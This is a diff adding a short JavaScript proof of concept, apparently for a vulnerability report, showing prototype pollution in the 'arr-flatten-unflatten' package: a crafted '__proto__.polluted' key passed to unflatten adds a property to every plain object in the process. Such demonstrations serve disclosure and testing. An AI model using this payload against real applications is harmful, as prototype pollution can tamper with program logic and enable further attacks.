@@ -1,0 +1,13 @@
+```javascript
+const unflatten = require("./node_modules/arr-flatten-unflatten/unflatten.js");
+
+// Craft a flattened key that walks up to Object.prototype via "__proto__"
+const payload = { "__proto__.polluted": "yes" };
+
+console.log("Before:", ({}).polluted); // undefined
+
+unflatten(payload);
+
+// Every plain object in the process is now polluted
+console.log("After:", ({}).polluted); // "yes"
+```
